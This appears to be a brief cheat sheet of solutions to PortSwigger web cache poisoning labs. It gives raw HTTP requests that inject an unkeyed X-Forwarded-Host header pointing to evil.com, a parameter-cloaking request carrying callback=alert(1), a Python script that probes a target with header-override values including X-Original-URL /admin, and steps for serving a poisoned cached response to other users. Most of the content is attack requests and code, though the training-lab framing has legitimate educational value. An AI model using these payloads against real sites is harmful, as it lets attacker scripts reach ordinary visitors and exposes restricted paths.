# Web Cache Poisoning Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Unkeyed header injection
**Approach**: Inject via unkeyed header (X-Forwarded-Host)
```
GET / HTTP/1.1
Host: TARGET
X-Forwarded-Host: evil.com
# Server uses X-Forwarded-Host for URLs
# Cache serves poisoned response to all users
```

### Lab 2: Parameter cloaking
**Approach**: Unkeyed param hides keyed param
```
GET /?utm_content=x;callback=alert(1) HTTP/1.1
Host: TARGET
# Cache key: /?utm_content=x
# But server parses: callback=alert(1)
```

### Lab 3: Cache key injection
**Approach**: Inject into cache key via unkeyed header
```
GET / HTTP/1.1
Host: TARGET
X-Forwarded-Host: evil.com
# Cache key includes Host
# But response includes script from evil.com
```

## Detection
```python
import requests
headers = {
    "X-Forwarded-Host": "evil.com",
    "X-Original-URL": "/admin",
    "X-Rewrite-URL": "/admin",
}
r = requests.get("https://TARGET", headers=headers)
if "evil.com" in r.text:
    print("Cache poisoning possible")
```

## Exploit Steps
1. Send request with unkeyed header
2. Check if response reflects the header
3. Check if response is cached (X-Cache: hit)
4. Use exploit server to host payload
5. Other users get poisoned response
